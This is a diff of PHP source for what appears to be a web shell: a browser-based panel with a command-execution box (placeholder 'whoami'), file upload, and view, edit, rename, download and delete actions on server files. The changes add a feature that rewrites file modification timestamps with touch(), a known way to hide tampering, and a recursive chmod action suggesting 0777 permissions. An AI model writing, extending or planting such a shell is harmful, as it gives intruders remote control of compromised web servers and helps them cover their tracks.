-					<input class='form-control btn-sm text-dark' type='text' name='cmd' value='".htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8')."' placeholder='whoami' $_r>
-					<button class='btn btn-outline-light btn-sm' type='sumbit'><i class='bi bi-arrow-return-right'></i></button>
+					<input class='form-control btn-sm text-dark' type='text' name='cmd' value='" .
+            htmlspecialchars($_POST["cmd"], ENT_QUOTES, "UTF-8") .
+            "' placeholder='whoami' $_r>
+					<button class='btn btn-outline-light btn-sm' type='sumbit'><i class='bi bi-capslock'></i></button>
 				</div>
 			</form>";
-			if($cmd):
-			echo '
+        if ($cmd):
+            echo '
 			<div class="container-fluid language-javascript">
 				<div class="shell mb-3">
-					<pre style="font-size:10px;">$&nbsp;<rd>'.htmlspecialchars($_POST['cmd']).'</rd><br><code>'.htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8').'</code></pre>
+					<pre style="font-size:10px;">$&nbsp;<rd>' .
+                htmlspecialchars($_POST["cmd"]) .
+                "</rd><br><code>" .
+                htmlspecialchars($cmd, ENT_QUOTES, "UTF-8") .
+                '</code></pre>
 				</div>
 			</div>';
-			elseif(!$cmd && $_SERVER['REQUEST_METHOD'] == 'POST'):
-			echo '
+        elseif (!$cmd && $_SERVER["REQUEST_METHOD"] == "POST"):
+            echo '
 			<div class="container-fluid language-javascript">
 				<div class="shell mb-3">
 					<pre style="font-size:10px;"><code>No result</code></pre>
 				</div>
 			</div>
 		</div>';
-		endif;
-		}
+        endif;
+    }
 		// multiple file upload
 		if($_7['id'] == 'upload'){
 		s();
@@ -1208,6 +1586,8 @@ echo "<br><form method='post' target='_blank' action='$url' enctype='multipart/f
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified&opn=$file'><i class='bi bi-calendar-date'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$file'><i class='bi bi-download'></i></a>
 			<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
 		</div>
@@ -1237,6 +1617,8 @@ echo "<br><form method='post' target='_blank' action='$url' enctype='multipart/f
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified&opn=$file'><i class='bi bi-calendar-date'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$file'><i class='bi bi-download'></i></a>
 			<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
 		</div>
@@ -1300,6 +1682,8 @@ echo "<br><form method='post' target='_blank' action='$url' enctype='multipart/f
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified&opn=$file'><i class='bi bi-calendar-date'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$file'><i class='bi bi-download'></i></a>
 			<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
 		</div>
@@ -1313,6 +1697,107 @@ echo "<br><form method='post' target='_blank' action='$url' enctype='multipart/f
 			</div>
 		</form>";
 		}
+		// change date modified
+if ($_7["action"] == "changemodified") {
+    s();
+    function changeDate($itemPath, $newDate)
+    {
+        if (is_file($itemPath) || is_dir($itemPath)) {
+            if (touch($itemPath, strtotime($newDate))) {
+                return true;
+            } else {
+                return false;
+            }
+        }
+        return false;
+    }
+    $currentTime = microtime(true);
+    $microseconds = sprintf("%06d", ($currentTime - floor($currentTime)) * 1000000);
+    $dateTimeWithMicroseconds = date("Y-m-d H:i:s.", $currentTime) . $microseconds;
+    $itemToChangeDate = $_GET["opn"];
+    $itemPathToChangeDate = $path . "/" . $itemToChangeDate;
+    echo "<div class='btn-group'>
+<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
+<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
+<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
+<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified&opn=$file'><i class='bi bi-calendar-date'></i></a>
+<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
+<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
+</div>
+<br><i class='bi " . (is_dir($itemPathToChangeDate) ? "bi-folder" : "bi-file-earmark") . "'></i>:&nbsp;" . basename($itemPathToChangeDate) . "</br>
+<form method='POST'><div class='input-group'><input class='form-control btn-sm' type='text' name='new_date' value='".$dateTimeWithMicroseconds."' $_r>
+<button class='btn btn-outline-light btn-sm' type='sumbit' name='changemodified'><i class='bi bi-capslock'></i></button>
+</div>
+</form>";
+
+    if (isset($_POST["changemodified"])) {
+        $newDate = $_POST["new_date"];
+        if (changeDate($itemPathToChangeDate, $newDate)) {
+            echo "<strong>Change Date</strong> OK! " . ok() . "</div>";
+        } else {
+            echo "<strong>Change Date</strong> FAIL! " . er() . "</div>";
+        }
+    }
+}
+if ($_7["action"] == "chemod") {
+    s();
+
+    function chmodItem($itemPath, $newPermission)
+    {
+        if (is_file($itemPath)){
+            if (chmod($itemPath, octdec($newPermission))) {
+                return true;
+            } else {
+                return false;
+            }
+        }
+        return false;
+    }
+
+    function chmodDirectory($dirPath, $newPermission)
+    {
+        $items = scandir($dirPath);
+        foreach ($items as $item) {
+            if ($item != "." && $item != "..") {
+                $itemPath = $dirPath . "/" . $item;
+                if (is_dir($itemPath)) {
+                    chmodDirectory($itemPath, $newPermission);
+                }
+                chmodItem($itemPath, $newPermission);
+            }
+        }
+    }
+
+    $itemToChmod = $_GET["opn"];
+    $itemPathToChmod = $path . "/" . $itemToChmod;
+
+    echo "<div class='btn-group'>
+    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye'></i></a>
+    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
+    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
+    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified&opn=$file'><i class='bi bi-calendar-date'></i></a>
+    <a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
+    <a class='btn btn-outline-danger btn-sm' shref='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
+    </div>
+    <br><i class='bi " . (is_dir($itemPathToChmod) ? "bi-folder" : "bi-file-earmark") . "'></i>:&nbsp;" . basename($itemPathToChmod) . "</br>
+    <form method='POST'><div class='input-group'><input class='form-control btn-sm' type='text' name='new_permission' placeholder='0777' $_r>
+    <button class='btn btn-outline-light btn-sm' type='submit' name='chemodkan'><i class='bi bi-capslock'></i></button>
+    </div>
+    </form>";
+
+    // Check if the form is submitted
+    if (isset($_POST["chemodkan"])) {
+        $newPermission = $_POST["new_permission"];
+        if (is_dir($itemPathToChmod)) {
+            chmodDirectory($itemPathToChmod, $newPermission);
+        } else {
+            chmodItem($itemPathToChmod, $newPermission);
+        }
+
+        echo "<strong>Change Permission</strong> OK! " . ok() . "</div>";
+    }
+}
+
 		//delete file
 		if ($_7['action'] == 'delete_file') {
 		s();
@@ -1329,6 +1814,8 @@ echo "<br><form method='post' target='_blank' action='$url' enctype='multipart/f
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$file'><i class='bi bi-eye-fill'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$file'><i class='bi bi-pencil-square'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$file'><i class='bi bi-pencil-fill'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified&opn=$file'><i class='bi bi-calendar-date'></i></a>
+			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
 			<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$file'><i class='bi bi-download'></i></a>
 			<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$file'><i class='bi bi-trash-fill'></i></a>
 		</div>
@@ -1534,6 +2021,8 @@ echo "<br><form method='post' target='_blank' action='$url' enctype='multipart/f
 				<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=view&opn=$path/$file'><i class='bi bi-eye-fill'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=edit&opn=$path/$file'><i class='bi bi-pencil-square'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=rename&opn=$path/$file'><i class='bi bi-pencil-fill'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=changemodified&opn=$file'><i class='bi bi-calendar-date'></i></a>
+				<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=chemod&opn=$file'><i class='bi bi-file-earmark-medical'></i></a>
 				<a class='btn btn-outline-light btn-sm' href='?dir=$path&action=download&opn=$path/$file'><i class='bi bi-download'></i></a>
 				<a class='btn btn-outline-danger btn-sm' href='?dir=$path&action=delete_file&opn=$path/$file'><i class='bi bi-trash-fill'></i></a>
 			</div>
